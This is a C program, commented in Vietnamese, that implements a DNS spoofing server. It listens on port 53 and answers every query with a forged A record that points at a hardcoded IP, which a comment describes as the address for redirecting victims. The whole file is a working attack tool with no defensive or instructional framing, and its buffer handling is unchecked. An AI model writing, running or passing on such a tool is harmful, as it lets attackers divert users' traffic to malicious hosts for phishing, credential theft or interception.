#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define SPOOFED_IP "192.168.1.100" // IP giả mạo để điều hướng nạn nhân
#define PORT 53
#define BUFFER_SIZE 512

typedef struct {
    unsigned short id; 

    unsigned char rd :1;
    unsigned char tc :1;
    unsigned char aa :1;
    unsigned char opcode :4;
    unsigned char qr :1;

    unsigned char rcode :4;
    unsigned char cd :1;
    unsigned char ad :1;
    unsigned char z :1;
    unsigned char ra :1;

    unsigned short q_count;
    unsigned short ans_count;
    unsigned short auth_count;
    unsigned short add_count;
} DNS_HEADER;

typedef struct {
    unsigned short qtype;
    unsigned short qclass;
} QUESTION;

#pragma pack(push, 1)
typedef struct {
    unsigned short type;
    unsigned short _class;
    unsigned int ttl;
    unsigned short data_len;
} R_DATA;
#pragma pack(pop)

void change_to_dns_format(unsigned char* dns, unsigned char* host) {
    int lock = 0, i;
    strcat((char*)host, ".");
    for (i = 0; i < strlen((char*)host); i++) {
        if (host[i] == '.') {
            *dns++ = i - lock;
            for (; lock < i; lock++) {
                *dns++ = host[lock];
            }
            lock++;
        }
    }
    *dns++ = '\0';
}

void handle_dns_request(int sock) {
    struct sockaddr_in client;
    unsigned char buffer[BUFFER_SIZE];
    socklen_t len = sizeof(client);
    
    // Nhận dữ liệu từ client
    int n = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&client, &len);
    if (n < 0) {
        perror("recvfrom failed");
        return;
    }

    // Trích xuất header DNS
    DNS_HEADER *dns = (DNS_HEADER*) buffer;
    dns->qr = 1;
    dns->aa = 1;
    dns->ra = 1;
    dns->ans_count = htons(1);

    // Trích xuất tên miền được truy vấn
    unsigned char *qname = (unsigned char*)&buffer[sizeof(DNS_HEADER)];
    QUESTION *qinfo = (QUESTION*)&buffer[sizeof(DNS_HEADER) + (strlen((const char*)qname) + 1)];
    
    unsigned char response[BUFFER_SIZE];
    memcpy(response, buffer, n);
    
    // Thêm phần trả lời vào phản hồi
    unsigned char *ans_name = &response[n];
    memcpy(ans_name, qname, strlen((const char*)qname) + 1);
    
    R_DATA *rdata = (R_DATA*)(ans_name + strlen((const char*)qname) + 1);
    rdata->type = htons(1);
    rdata->_class = htons(1);
    rdata->ttl = htonl(300);
    rdata->data_len = htons(4);
    
    struct in_addr addr;
    inet_pton(AF_INET, SPOOFED_IP, &addr);
    memcpy((unsigned char*)(rdata + 1), &addr, 4);
    
    int response_size = n + (strlen((const char*)qname) + 1) + sizeof(R_DATA) + 4;
    sendto(sock, response, response_size, 0, (struct sockaddr*)&client, len);
    printf("Spoofed response sent for %s -> %s\n", qname, SPOOFED_IP);
}

int main() {
    int sock;
    struct sockaddr_in server;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(PORT);

    if (bind(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("Bind failed");
        exit(1);
    }

    printf("DNS Spoofing Server started...\n");
    while (1) {
        handle_dns_request(sock);
    }

    close(sock);
    return 0;
}
